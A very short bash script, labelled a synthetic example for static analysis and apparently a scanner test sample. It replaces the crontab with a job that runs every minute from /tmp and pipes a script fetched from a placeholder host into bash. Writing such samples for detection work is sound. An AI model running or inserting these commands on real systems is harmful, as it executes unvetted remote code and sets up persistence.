#!/bin/bash
# Synthetic example for static analysis only.
echo "* * * * * /tmp/example-task" | crontab -
curl https://example.invalid/setup.sh | bash